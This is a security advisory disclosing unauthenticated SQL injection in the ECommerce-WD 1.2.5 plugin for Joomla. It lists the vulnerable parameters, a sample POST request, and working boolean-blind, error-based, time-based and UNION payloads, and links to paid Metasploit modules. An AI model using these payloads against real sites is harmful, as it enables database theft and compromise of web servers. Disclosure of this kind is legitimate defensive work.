@@ -1,0 +1,123 @@
+Version 1.2.5 of the ECommerce-WD plugin for Joomla! has multiple
+unauthenticated SQL injections available via the advanced search
+functionality.
+
+http://extensions.joomla.org/extension/ecommerce-wd
+
+The vulnerable parameters are search_category_id, sort_order, and
+filter_manufacturer_ids within the following request:
+
+POST
+/index.php?option=com_ecommercewd&controller=products&task=displayproducts
+HTTP/1.1
+Host: 172.31.16.49
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101
+Firefox/30.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://172.31.16.49/index.php?option=com_ecommercewd&view=products&layout=displayproducts&Itemid=120
+Cookie: 78fdafa5595397a1fc885bb2f0d74010=q1q1ud2sr0la18o5b38mkbdak2
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 321
+
+product_id=&product_count=&product_parameters_json=&search_name=&search_category_id=&filter_filters_opened=1&filter_manufacturer_ids=1&filter_price_from=&filter_price_to=&filter_date_added_range=0&filter_minimum_rating=0&filter_tags=&arrangement=thumbs&sort_by=&sort_order=asc&pagination_limit_start=0&pagination_limit=12
+
+
+Vectors:
+
+Parameter: filter_manufacturer_ids (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload:
+product_id=&product_count=&product_parameters_json=&search_name=&search_category_id=1&filter_filters_opened=1&filter_manufacturer_ids=1)
+AND 8066=8066 AND
+(7678=7678&filter_price_from=&filter_price_to=&filter_date_added_range=0&filter_minimum_rating=0&filter_tags=&arrangement=thumbs&sort_by=&sort_order=asc&pagination_limit_start=0&pagination_limit=12
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause
+    Payload:
+product_id=&product_count=&product_parameters_json=&search_name=&search_category_id=1&filter_filters_opened=1&filter_manufacturer_ids=1)
+AND (SELECT 7197 FROM(SELECT COUNT(*),CONCAT(0x71786a6b71,(SELECT
+(ELT(7197=7197,1))),0x71706a6a71,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND
+(1212=1212&filter_price_from=&filter_price_to=&filter_date_added_range=0&filter_minimum_rating=0&filter_tags=&arrangement=thumbs&sort_by=&sort_order=asc&pagination_limit_start=0&pagination_limit=12
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind (SELECT)
+    Payload:
+product_id=&product_count=&product_parameters_json=&search_name=&search_category_id=1&filter_filters_opened=1&filter_manufacturer_ids=1)
+AND (SELECT * FROM (SELECT(SLEEP(5)))SrXu) AND
+(1480=1480&filter_price_from=&filter_price_to=&filter_date_added_range=0&filter_minimum_rating=0&filter_tags=&arrangement=thumbs&sort_by=&sort_order=asc&pagination_limit_start=0&pagination_limit=12
+
+
+
+Parameter: search_category_id (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload:
+product_id=&product_count=&product_parameters_json=&search_name=&search_category_id=1)
+AND 3039=3039 AND
+(6271=6271&filter_filters_opened=1&filter_manufacturer_ids=1&filter_price_from=&filter_price_to=&filter_date_added_range=0&filter_minimum_rating=0&filter_tags=&arrangement=thumbs&sort_by=&sort_order=asc&pagination_limit_start=0&pagination_limit=12
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause
+    Payload:
+product_id=&product_count=&product_parameters_json=&search_name=&search_category_id=1)
+AND (SELECT 5158 FROM(SELECT COUNT(*),CONCAT(0x71786a6b71,(SELECT
+(ELT(5158=5158,1))),0x71706a6a71,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND
+(8257=8257&filter_filters_opened=1&filter_manufacturer_ids=1&filter_price_from=&filter_price_to=&filter_date_added_range=0&filter_minimum_rating=0&filter_tags=&arrangement=thumbs&sort_by=&sort_order=asc&pagination_limit_start=0&pagination_limit=12
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind (SELECT)
+    Payload:
+product_id=&product_count=&product_parameters_json=&search_name=&search_category_id=1)
+AND (SELECT * FROM (SELECT(SLEEP(5)))AUWc) AND
+(1251=1251&filter_filters_opened=1&filter_manufacturer_ids=1&filter_price_from=&filter_price_to=&filter_date_added_range=0&filter_minimum_rating=0&filter_tags=&arrangement=thumbs&sort_by=&sort_order=asc&pagination_limit_start=0&pagination_limit=12
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload:
+product_id=&product_count=&product_parameters_json=&search_name=&search_category_id=1)
+UNION ALL SELECT CONCAT(0x71786a6b71,0x704f43796c4773545349,0x71706a6a71)--
+&filter_filters_opened=1&filter_manufacturer_ids=1&filter_price_from=&filter_price_to=&filter_date_added_range=0&filter_minimum_rating=0&filter_tags=&arrangement=thumbs&sort_by=&sort_order=asc&pagination_limit_start=0&pagination_limit=12
+
+
+
+Parameter: sort_order (POST)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause
+    Payload:
+product_id=&product_count=&product_parameters_json=&search_name=&search_category_id=1&filter_filters_opened=1&filter_manufacturer_ids=1&filter_price_from=&filter_price_to=&filter_date_added_range=0&filter_minimum_rating=0&filter_tags=&arrangement=thumbs&sort_by=&sort_order=asc,(SELECT
+(CASE WHEN (8973=8973) THEN 1 ELSE 8973*(SELECT 8973 FROM
+INFORMATION_SCHEMA.CHARACTER_SETS)
+END))&pagination_limit_start=0&pagination_limit=12
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.11 time-based blind - ORDER BY, GROUP BY clause
+    Payload:
+product_id=&product_count=&product_parameters_json=&search_name=&search_category_id=1&filter_filters_opened=1&filter_manufacturer_ids=1&filter_price_from=&filter_price_to=&filter_date_added_range=0&filter_minimum_rating=0&filter_tags=&arrangement=thumbs&sort_by=&sort_order=asc,(SELECT
+(CASE WHEN (6064=6064) THEN SLEEP(5) ELSE 6064*(SELECT 6064 FROM
+INFORMATION_SCHEMA.CHARACTER_SETS)
+END))&pagination_limit_start=0&pagination_limit=12
+
+
+Metasploit modules that exploit the UNION-based injection are available on
+ExploitHub:
+
+Enumerate users --
+https://exploithub.com/joomla-e-commerce-wd-plugin-users-enumeration-via-sql-injection.html
+Read files --
+https://exploithub.com/joomla-e-commerce-wd-plugin-file-download-via-sql-injection.html
+Write payload to web directory --
+https://exploithub.com/joomla-e-commerce-wd-plugin-sql-injection.html
+
+-- 
+http://volatile-minds.blogspot.com -- blog
+http://www.volatileminds.net -- website
+
